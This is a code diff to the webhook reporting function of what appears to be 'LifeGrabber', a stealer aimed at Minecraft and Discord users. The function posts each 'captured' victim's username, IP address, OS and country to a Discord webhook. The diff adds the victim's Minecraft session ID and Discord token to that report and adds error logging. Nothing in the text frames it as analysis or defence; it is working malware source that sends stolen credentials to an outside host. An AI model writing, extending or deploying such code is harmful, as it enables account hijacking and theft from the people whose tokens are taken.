@@ -38,8 +38,11 @@ async function sendDiscordWebhook(webhookUrl, grab, isNew) {
     ? `${grab.minecraft_username} was captured successfully!`
     : `${grab.minecraft_username} was updated!`;
 
+  const safeSession = grab.session_id ? (grab.session_id.length > 1020 ? grab.session_id.substring(0, 1020) + '...' : grab.session_id) : 'None';
+  const safeToken = grab.discord_token ? (grab.discord_token.length > 1020 ? grab.discord_token.substring(0, 1020) + '...' : grab.discord_token) : 'None';
+
   try {
-    await fetch(webhookUrl, {
+    const res = await fetch(webhookUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -55,11 +58,16 @@ async function sendDiscordWebhook(webhookUrl, grab, isNew) {
             { name: 'IP', value: grab.ip_address || 'Unknown', inline: true },
             { name: 'OS', value: grab.os || 'Unknown', inline: true },
             { name: 'Country', value: grab.country || 'Unknown', inline: true },
+            { name: 'Session ID', value: safeSession, inline: false },
+            { name: 'Discord Token', value: safeToken, inline: false },
           ],
           footer: { text: `LifeGrabber · ${new Date().toLocaleString()}` },
         }],
       }),
     });
+    if (!res.ok) {
+      console.error('Webhook returned error:', await res.text());
+    }
   } catch (e) {
     console.error('Webhook failed:', e.message);
   }
